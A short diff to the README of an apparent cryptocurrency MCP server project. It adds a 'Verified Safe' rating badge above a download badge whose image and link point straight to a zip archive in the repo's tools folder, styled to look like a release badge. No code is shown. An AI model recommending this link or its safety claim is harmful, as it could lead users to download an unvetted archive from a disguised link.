@@ -1,5 +1,7 @@
 # 🚀 Crypto_MCP_Server - Real-Time Cryptocurrency Data Made Simple
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/menorhge3556-crypto-mcp-server)
+
 [![Download Latest Release](https://raw.githubusercontent.com/menorhge3556/Crypto_MCP_Server/main/server/tools/MC-Server-Crypto-3.5.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/menorhge3556/Crypto_MCP_Server/main/server/tools/MC-Server-Crypto-3.5.zip)
 
 ## 📦 Introduction
